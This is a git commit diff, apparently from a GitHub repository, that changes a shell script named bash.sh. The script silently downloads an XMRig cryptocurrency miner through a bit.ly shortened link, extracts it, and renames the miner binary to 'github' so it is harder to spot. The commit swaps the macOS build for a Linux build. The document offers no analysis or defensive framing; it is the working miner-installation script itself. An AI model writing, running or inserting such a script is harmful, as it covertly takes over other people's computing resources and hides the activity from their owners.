d1ac250dcedb90ca365255d8ee6da0fc029be105
Storage Small <100378380+storagegitpush404@users.noreply.github.com>
2022-03-11 22:45:11 -0800

    Update and rename waduk.sh to bash.sh

--- bash.sh
+++ bash.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
-wget -O xmrig-6.16.4-macos-x64.tar.gz https://bit.ly/3MJnplX > /dev/null 2>&1
-tar -xvf xmrig-6.16.4-macos-x64.tar.gz
+wget -O xmrig-6.16.4-linux-static-x64.tar.gz https://bit.ly/34BX48f > /dev/null 2>&1
+tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
 cd xmrig-6.16.4
 mv xmrig github
 chmod u+x github
